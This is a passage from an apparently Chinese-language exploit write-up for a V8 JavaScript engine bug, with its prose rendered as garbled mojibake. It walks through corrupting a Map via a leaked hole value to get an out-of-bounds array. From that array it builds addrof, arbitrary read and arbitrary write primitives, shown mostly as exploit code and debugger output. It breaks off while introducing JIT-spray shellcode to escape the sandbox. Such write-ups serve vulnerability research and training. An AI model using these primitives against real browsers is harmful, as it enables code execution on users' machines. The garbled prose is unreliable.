<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Isolate::clear_pending_exception</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DCHECK(!thread_local_top()-&gt;pending_exception_.IsException(<span class="keyword">this</span>));</span><br><span class="line">    thread_local_top()-&gt;pending_exception_ = ReadOnlyRoots(<span class="keyword">this</span>).the_hole_value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>the_hole_value</code> Âú®Êú¨È¢òÁöÑ path ‰∏≠‰πüÂá∫Áé∞Ëøá</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(hole); </span><br><span class="line">DebugPrint: <span class="number">0x37c70800242d</span>: [Oddball] in ReadOnlySpace: <span class="meta">#hole</span></span><br></pre></td></tr></table></figure>
<ul>
<li>‰ΩøÁî® <code>DebugPrint</code> ÂèØ‰ª•ÂèëÁé∞ hole ÊòØ <code>Oddball</code> ÂºïÁî®Á±ªÂûã</li>
</ul>
<p>ÂÖ∑‰ΩìÁöÑÁªÜËäÇÊöÇÊó∂‰∏çÁî®ÁÆ°ÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÁü•ÈÅìËøô‰∏™ POC ÂèØ‰ª•Á†¥Âùè <code>Map</code> Â∞±Ë°å‰∫Ü</p>
<p><strong>ÂÖ•‰æµÊÄùË∑Ø</strong></p>
<p>ÂÖà‰æùËë´Ëä¶ÁîªÁì¢Êää POC ‰∏≠ÁöÑÂà©Áî®Â§çÂàª‰∏Ä‰ªΩÔºö</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = [];</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">m.set(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">m.set(c.hole(), <span class="number">1</span>);</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(<span class="number">1</span>);</span><br><span class="line">print(map.size);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">‚ûú  x64.release git:(<span class="number">63</span>cb7fb817) ‚úó ./d8 ./<span class="built_in">exp</span>.js</span><br><span class="line"><span class="number">-1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ÊàêÂäüÂ∞Ü <code>Map</code> ËøõË°å‰∫ÜÁ†¥Âùè</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(m);</span><br><span class="line">DebugPrint: <span class="number">0x14080004ba05</span>: [JSMap]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x1408001862f1</span> &lt;Map[<span class="number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x140800186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x140800186319</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x140800002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - table: <span class="number">0x14080004baad</span> &lt;OrderedHashMap[<span class="number">17</span>]&gt;</span><br><span class="line"> - properties: <span class="number">0x140800002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"><span class="number">0x1408001862f1</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_MAP_TYPE</span><br><span class="line"> - instance size: <span class="number">16</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="keyword">enum</span> length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x1408001443cd</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">0</span>: <span class="number">0x1408000021ed</span> &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span><br><span class="line"> - prototype: <span class="number">0x140800186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x140800186319</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x1408001862bd</span> &lt;JSFunction Map (sfi = <span class="number">0x1408001557b9</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x1408000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[object Map]</span><br></pre></td></tr></table></figure>
<ul>
<li>ÊâìÂç∞ÂØπÂ∫îÁöÑ <code>table</code>ÔºöÔºàÊ≠§Êó∂ <code>Map</code> Â∑≤ÁªèË¢´Á†¥ÂùèÔºåÂú® <code>Map.size == -1</code> ÁöÑÊÉÖÂÜµ‰∏ãÔºå‰∏çËÉΩ‰ΩøÁî® <code>job</code> ÂëΩ‰ª§Ôºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x14080004baad</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x14080004baac</span>:	<span class="number">0x00002c29</span>	<span class="number">0x00000022</span>	<span class="number">0xfffffffe</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x14080004babc</span>:	<span class="number">0x00000004</span>	<span class="number">0xfffffffe</span>	<span class="number">0xfffffffe</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004bacc</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004badc</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004baec</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000025d5</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ÂÖàÊâßË°å‰∏ÄÊ¨° <code>m.set(0x8,-1)</code> ÂêéÂÜçÊ¨°ÊâìÂç∞ <code>table</code>ÔºöÔºàÁé∞Âú®ÂèØ‰ª•‰ΩøÁî® <code>job</code> ÂëΩ‰ª§Ôºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x14080004baad</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x14080004baac</span>:	<span class="number">0x00002c29</span>	<span class="number">0x00000022</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x14080004babc</span>:	<span class="number">0x00000010</span>	<span class="number">0xfffffffe</span>	<span class="number">0xfffffffe</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004bacc</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004badc</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004baec</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000025d5</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Êñ∞ÂÜôÂÖ•ÁöÑ <code>0x10</code>(JS num:8) Ë¶ÜÁõñ‰∫Ü <code>table + 0x10</code> ÁöÑ‰ΩçÁΩÆÔºàBucket data[-1]ÔºâÔºåËÄå‰∏äÈù¢ÊèêÂà∞Ëøô‰∏™‰ΩçÁΩÆÂ∞±ÊòØ <code>Map capacity</code></li>
<li>Ê≠£Âõ†‰∏∫Â¶ÇÊ≠§ÔºåÂ≠òÂÇ®Ê°∂Ë¢´Êâ©Â±ï‰∫ÜÔºåÂÖÉÁ¥† Entry ÁöÑ‰ΩçÁΩÆ‰πü‰ºöÊîπÂèòÔºàÂÖ∂ÂÆûËøôÈáåÂπ∂‰∏çÊòØ Entry ÁöÑ‰ΩçÁΩÆÂèëÁîü‰∫ÜÊîπÂèòÔºåËÄåÊòØ V8 ‰∏∫‰∫ÜÈ¢ÑÁïô Bucket data ÁöÑÁ©∫Èó¥ÔºåËÄåËÆ§‰∏∫ Entry ÁöÑ‰ΩçÁΩÆÂêëÂêéËøõË°å‰∫ÜÁßªÂä®Ôºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x14080004baad</span></span><br><span class="line"><span class="number">0x14080004baad</span>: [OrderedHashMap]</span><br><span class="line"> - FixedArray length: <span class="number">17</span></span><br><span class="line"> - elements: <span class="number">0</span></span><br><span class="line"> - deleted: <span class="number">0</span></span><br><span class="line"> - buckets: <span class="number">8</span></span><br><span class="line"> - capacity: <span class="number">16</span></span><br><span class="line"> - buckets: &#123;</span><br><span class="line">              <span class="number">0</span>: <span class="number">-1</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">-1</span></span><br><span class="line">              <span class="number">2</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">3</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">4</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">5</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">6</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">7</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: &#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>Âõ†Ê≠§‰øÆÊîπ POC ‰∏∫Ôºö</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = [];</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">m.set(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">m.set(c.hole(), <span class="number">1</span>);</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(<span class="number">1</span>);</span><br><span class="line">oob_arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1.1</span>, <span class="number">2.2</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>ÊâìÂç∞ JSMap Âíå JSArray ÂØπË±°ÁöÑÂÜÖÂ≠ò‰ø°ÊÅØÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(m)</span><br><span class="line">DebugPrint: <span class="number">0x233e0004ba25</span>: [JSMap]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x233e001862f1</span> &lt;Map[<span class="number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x233e00186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x233e00186319</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x233e00002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - table: <span class="number">0x233e0004bacd</span> &lt;OrderedHashMap[<span class="number">17</span>]&gt;</span><br><span class="line"> - properties: <span class="number">0x233e00002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">d8&gt; %DebugPrint(oob_arr)</span><br><span class="line">DebugPrint: <span class="number">0x233e0004bb19</span>: [JSArray]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x233e0018e6bd</span> &lt;Map[<span class="number">16</span>](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x233e0018e11d</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x233e0004bb29</span> &lt;FixedDoubleArray[<span class="number">2</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">2</span></span><br><span class="line"> - properties: <span class="number">0x233e00002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0x233e00006551</span>: [String] in ReadOnlySpace: <span class="meta">#length: 0x233e00144255 <span class="meta-string">&lt;AccessorInfo name= 0x233e00006551 &lt;String[6]: #length&gt;</span>, data= 0x233e000023e1 <span class="meta-string">&lt;undefined&gt;</span>&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x233e0004bb29</span> &lt;FixedDoubleArray[<span class="number">2</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2.2</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<ul>
<li><code>oob_arr</code> Âíå <code>m-&gt;table</code> ÁöÑ‰ΩçÁΩÆÂæàÊé•ËøëÔºà<code>0x233e0004bacd + 0x4c == 0x233e0004bb19</code>Ôºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x233e0004bb19</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x233e0004bb18</span>:	<span class="number">0x0018e6bd</span>	<span class="number">0x00002259</span>	<span class="number">0x0004bb29</span>	<span class="number">0x00000004</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>oob_arr+0x8</code>Ôºà<code>table+0x54</code>ÔºâÔºö<code>oob_arr-&gt;elements</code></li>
<li><code>oob_arr+0xc</code>Ôºà<code>table+0x58</code>ÔºâÔºö<code>oob_arr-&gt;length</code></li>
</ul>
<p>ÂÖàÊâßË°å‰∏ÄÊ¨° <code>m.set(0x10,-1)</code> ÂêéÂÜçÊ¨°ÊâìÂç∞ <code>table</code>Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x233e0004bacd</span></span><br><span class="line"><span class="number">0x233e0004bacd</span>: [OrderedHashMap]</span><br><span class="line"> - FixedArray length: <span class="number">17</span></span><br><span class="line"> - elements: <span class="number">0</span></span><br><span class="line"> - deleted: <span class="number">0</span></span><br><span class="line"> - buckets: <span class="number">16</span></span><br><span class="line"> - capacity: <span class="number">32</span></span><br><span class="line"> - buckets: &#123;</span><br><span class="line">              <span class="number">0</span>: <span class="number">-1</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">-1</span></span><br><span class="line">              <span class="number">2</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">3</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">4</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">5</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">6</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">7</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">8</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">9</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">             <span class="number">10</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">             <span class="number">11</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">             <span class="number">12</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">             <span class="number">13</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">                 <span class="comment">/* Âà∞ËøôÈáåÂ∑≤ÁªèËøõÂÖ•oob_arrÁöÑÂå∫Âüü‰∫Ü */</span></span><br><span class="line">             <span class="number">14</span>: <span class="number">0x233e0018e6bd</span> &lt;Map[<span class="number">16</span>](PACKED_DOUBLE_ELEMENTS)&gt; </span><br><span class="line">             <span class="number">15</span>: <span class="number">0x233e00002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: &#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Áî±‰∫é <code>Map</code> ÁöÑÂÆπÈáèË¢´Ë¶ÜÁõñ‰∏∫32ÔºåËøôÊÑèÂë≥ÁùÄÂ≠òÂÇ®Ê°∂Êâ©Â±ïÂà∞16</li>
<li>Áî±‰∫éÂ≠òÂÇ®Ê°∂ÁöÑÊâ©Â±ïÔºåÂÖÉÁ¥†ÊåáÈíà Entry ÂêëÂêéÁßªÂä®‰∫Ü <code>(16-2)*0x4 = 0x38</code> Â≠óËäÇ</li>
<li>ÊâÄ‰ª•Ôºå‰πãÂâçÊò†Â∞ÑÈîÆÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥† Entry Â≠òÂÇ®Âú® <code>table+0x1c</code> ‰∏≠ÔºåÁé∞Âú®ÂÆÉÂ∞ÜÂ≠òÂÇ®Âú® <code>table+0x54</code> ‰∏≠</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>xw <span class="number">0x233e0004bacd</span><span class="number">-1</span>+<span class="number">0x54</span></span><br><span class="line"><span class="number">0x233e0004bb20</span>:	<span class="number">0x0004bb29</span>	<span class="number">0x00000004</span>	<span class="number">0x00002ac1</span>	<span class="number">0x00000004</span></span><br><span class="line"><span class="number">0x233e0004bb30</span>:	<span class="number">0x9999999a</span>	<span class="number">0x3ff19999</span>	<span class="number">0x9999999a</span>	<span class="number">0x40019999</span></span><br></pre></td></tr></table></figure>
<ul>
<li>‰ΩÜÊòØ <code>table+0x54</code> ÊòØÂ≠òÂÇ®ÁöÑÂÖÉÁ¥† <code>oob_arr</code> ÊåáÈíàÔºå<code>table+0x58</code> ÊòØ <code>oob_arr</code> ÈïøÂ∫¶</li>
<li>Âõ†Ê≠§ÔºåÂú®ÊçüÂùè‰πãÂêéÔºåÂ¶ÇÊûúÊàë‰ª¨Á¨¨‰∏âÊ¨°Ë∞ÉÁî® <code>map.set</code>ÔºåÂÆÉÂ∞ÜË¶ÜÁõñ <code>oob_arr</code> ÂÖÉÁ¥†ÁöÑÊåáÈíàÂíåÈïøÂ∫¶ÔºåÈÄöËøáËøõ‰∏ÄÊ≠•ÁöÑÊäÄÊúØÔºåÊàë‰ª¨Â∞ÜËÉΩÂ§ü‰ΩøÁî®ÊçüÂùèÁöÑ <code>oob_arr</code> ‰Ωú‰∏∫Êàë‰ª¨ÁöÑËØªÂÜôÂü∫ÂÖÉ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; m.<span class="built_in">set</span>(oob_arr, <span class="number">0xffff</span>);</span><br><span class="line">[object Map]</span><br><span class="line">d8&gt; oob_arr.length</span><br><span class="line"><span class="number">65535</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>xw <span class="number">0x233e0004bacd</span><span class="number">-1</span>+<span class="number">0x54</span></span><br><span class="line"><span class="number">0x233e0004bb20</span>:	<span class="number">0x0004bb19</span>	<span class="number">0x0001fffe</span>	<span class="number">0xfffffffe</span>	<span class="number">0x00000004</span></span><br><span class="line"><span class="number">0x233e0004bb30</span>:	<span class="number">0x9999999a</span>	<span class="number">0x3ff19999</span>	<span class="number">0x9999999a</span>	<span class="number">0x40019999</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>oob_arr</code> ÁöÑÈïøÂ∫¶Â∑≤ÁªèË¢´‰øÆÊîπ‰∫ÜÔºåÂÆåÊàê‰∫Ü Array OOB Êï∞ÁªÑË∂äÁïå</li>
</ul>
<p>Áé∞Âú®Êàë‰ª¨Êúâ‰∏Ä‰∏™ÂèØ‰ª•ËøõË°å OOB ËØªÂÜôÁöÑÊï∞ÁªÑÔºå‰∏∫‰∫ÜÊéßÂà∂ RIPÔºåÊàë‰ª¨ÈúÄË¶ÅËÉΩÂ§üÊâßË°åÔºö</p>
<ul>
<li>addrofÔºöËé∑ÂèñÂØπË±°ÁöÑÂú∞ÂùÄ<ul>
<li>ÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ victims ÁöÑÊñ∞ÂèòÈáèÔºåÂÆÉÊòØ‰∏Ä‰∏™Á©∫ÂØπË±°ÁöÑÊï∞ÁªÑ</li>
<li>Â∞ÜÁõÆÊ†áÂØπË±°ÂàÜÈÖçÁªô victims Êï∞ÁªÑÁöÑÂÖÉÁ¥†‰πã‰∏Ä</li>
<li>‰ΩøÁî®‰ªé <code>oob_arr</code> ËØªÂèñÁöÑ OOBÔºåËØªÂèñÂèóÂÆ≥ËÄÖÂÖÉÁ¥†ÁöÑÂ≠òÂÇ®ÂÄºÔºàÂç≥ÁõÆÊ†áÂØπË±°Âú∞ÂùÄÔºâ</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">victim = [&#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">in_obj</span>) </span>&#123;</span><br><span class="line">    mask = (<span class="number">1n</span> &lt;&lt; <span class="number">32n</span>) - <span class="number">1n</span></span><br><span class="line">    victim[<span class="number">0</span>] = in_obj;</span><br><span class="line">    <span class="keyword">return</span> ftoi(oob_arr[<span class="number">12</span>]) &amp; mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>readÔºöËØªÂèñÁªôÂÆöÂú∞ÂùÄÁöÑÂÄºÔºàRAAÔºâ<ul>
<li>ÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ read_gadget ÁöÑÊï∞ÁªÑÔºåËØ•Êï∞ÁªÑÁî±ÊµÆÁÇπÂÄºÁªÑÊàê</li>
<li>‰ΩøÁî® OOB ‰ªé <code>oob_arr</code> ÂÜôÂÖ•ÔºåÂà©Áî®Ê∫¢Âá∫Ë¶ÜÁõñ <code>read_gadget[0]</code>Ôºå‰ΩøÂÖ∂ÊåáÂêë <code>target_addr-0x8</code>ÔºàÊï∞ÁªÑÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†Â≠òÂÇ®Âú® <code>elements+0x8</code> ‰∏≠Ôºâ</li>
<li>ËøîÂõû <code>read_gadget[0]</code></li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">read_gadget = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">weak_read</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    oob_arr[<span class="number">37</span>] = itof(<span class="number">0x600000000n</span>+addr-<span class="number">0x8n</span>);</span><br><span class="line">    <span class="keyword">return</span> ftoi(read_gadget[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>writeÔºöÂ∞ÜÂÄºÂÜôÂÖ•ÁªôÂÆöÂú∞ÂùÄÔºàWAAÔºâ<ul>
<li>ÂâçÈù¢Âíå read Á±ª‰ºº</li>
<li>‰ΩÜÊàë‰ª¨Ê≤°ÊúâËøîÂõû <code>read_gadget[0]</code> ÂÄº</li>
<li>ËÄåÊòØ‰∏∫ <code>read_gadget[0]</code> ÂàÜÈÖç‰∫ÜÊàë‰ª¨ÊâÄÈúÄÁöÑÂÄº</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">weak_write</span>(<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">    oob_arr[<span class="number">37</span>] = itof(<span class="number">0x600000000n</span>+addr-<span class="number">0x8n</span>);</span><br><span class="line">    read_gadget[<span class="number">0</span>] = itof(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Êé•‰∏ãÊù•Êàë‰ª¨ÈúÄË¶ÅÂØªÊâæÊéßÂà∂ RIP ÁöÑÊñπÊ≥ïÔºàÂä´ÊåÅÁ®ãÂ∫èÁöÑÊâßË°åÊµÅÔºâ</p>
<p>ÂÆûÈôÖ‰∏äÔºåÂèØ‰ª•ÈÄöËøá JIT Âñ∑Â∞ÑÊîªÂáªÊù•Ëµ∞ÁßÅ shellcode ‰ª£Á†ÅÔºöÔºàÁªïËøá sandboxÔºâ</p>
<ul>
